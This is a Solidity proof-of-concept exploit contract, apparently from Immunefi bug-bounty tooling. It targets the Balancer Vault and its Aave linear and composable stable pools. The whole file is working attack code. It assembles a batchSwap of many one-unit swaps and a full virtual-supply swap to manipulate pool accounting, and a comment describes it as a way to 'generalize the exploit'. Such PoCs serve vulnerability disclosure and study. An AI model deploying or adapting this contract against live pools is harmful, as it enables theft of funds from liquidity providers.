// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@immunefi/PoC.sol";
import "./interfaces/Vault.sol";
import "./interfaces/ComposableStablePool.sol";
import "./interfaces/AaveLinearPool.sol";

contract AttackContract is PoC {
    address vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    struct Balances {
        uint256 totalInitialUsd;
        uint256 finalBalance;
        uint256 usdcFinalBalance;
        uint256 daiFinalBalance;
        uint256 usdtFinalBalance;
        uint256 stgFinalBalance;
    }

    function getParameters(
        address pool,
        address asset,
        address wrappedToken,
        Vault.FundManagement memory funds,
        address[] memory assets,
        int256[] memory,
        /**
         * limits
         **/
        uint256 steps
    ) public returns (Vault.BatchSwapStep[] memory) {
        bytes32 poolId = ComposableStablePool(pool).getPoolId();
        // To generalize the exploit, we need to get everything into one batchSwap
        // First step, if there's no enough wrapped token in the pool, we want to
        // swap "to" the bpt token "from" wrapped token. In this case, we don't need
        // to interact with the wrapped token itself.
        // Vault.BatchSwapStep[] memory swaps = new Vault.BatchSwapStep[](0);

        uint256 wrappedTokenBalance = getTokenBalance(pool, wrappedToken);
        uint256 newWrappedTokenBalance;
        if (wrappedTokenBalance < 1 ether) {
            Vault.BatchSwapStep[] memory _swaps = new Vault.BatchSwapStep[](1);
            _swaps[0] =
                Vault.BatchSwapStep({poolId: poolId, assetInIndex: 2, assetOutIndex: 0, amount: 1 ether, userData: ""});
            int256[] memory output = Vault(vault).queryBatchSwap(uint8(Vault.SwapKind.GIVEN_OUT), _swaps, assets, funds);
            newWrappedTokenBalance = uint256(output[2]);
        }
        uint256 assetTokenBalance = getTokenBalance(pool, asset);

        Vault.BatchSwapStep[] memory swaps = new Vault.BatchSwapStep[](steps + 5);

        swaps[0] = Vault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 2,
            assetOutIndex: 0,
            amount: 1 ether, // assume no lower targets
            userData: ""
        });

        swaps[1] = Vault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 0,
            assetOutIndex: 1,
            amount: assetTokenBalance, // assume no lower targets
            userData: ""
        });

        swaps[2] = Vault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 0,
            assetOutIndex: 2,
            amount: newWrappedTokenBalance - steps * 20, // assume no lower targets
            userData: ""
        });

        for (uint256 i = 0; i < steps; i++) {
            swaps[i + 3] =
                Vault.BatchSwapStep({poolId: poolId, assetInIndex: 1, assetOutIndex: 2, amount: 1, userData: ""});
        }

        swaps[steps + 3] = Vault.BatchSwapStep({
            poolId: poolId,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: getVirtualSupply(pool),
            userData: ""
        });

        swaps[steps + 4] =
            Vault.BatchSwapStep({poolId: poolId, assetInIndex: 1, assetOutIndex: 2, amount: steps * 19, userData: ""});

        return swaps;
    }

    function getTokenBalance(address pool, address token) public view returns (uint256 balance) {
        bytes32 poolId = ComposableStablePool(pool).getPoolId();
        (address[] memory tokens, uint256[] memory balances,) = Vault(vault).getPoolTokens(poolId);
        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == token) {
                return balances[i];
            }
        }
    }

    function getVirtualSupply(address pool) public view returns (uint256) {
        uint256 totalSupply = IERC20(pool).totalSupply();
        bytes32 poolId = ComposableStablePool(pool).getPoolId();
        (address[] memory tokens, uint256[] memory balances,) = Vault(vault).getPoolTokens(poolId);

        for (uint256 i = 0; i < tokens.length; i++) {
            if (tokens[i] == pool) {
                return totalSupply - balances[i];
            }
        }
        return 0;
    }

    function swapDecrease(address pool) public {
        address wrappedToken = AaveLinearPool(pool).getWrappedToken();
        address asset = AaveLinearPool(pool).getMainToken();

        Vault.FundManagement memory funds;
        address[] memory assets = new address[](3);
        int256[] memory limits = new int256[](3);
        {
            funds.sender = address(this);
            funds.fromInternalBalance = false;
            funds.recipient = address(this);
            funds.toInternalBalance = false;

            assets[0] = pool;
            assets[1] = asset;
            assets[2] = wrappedToken;

            limits[0] = 2 ** 128;
            limits[1] = 2 ** 128;
            limits[2] = 2 ** 128;
        }

        uint256 steps = 20;
        Vault.BatchSwapStep[] memory swaps = getParameters(pool, asset, wrappedToken, funds, assets, limits, steps);

        Vault(vault).batchSwap(Vault.SwapKind.GIVEN_OUT, swaps, assets, funds, limits, block.timestamp);
    }
}
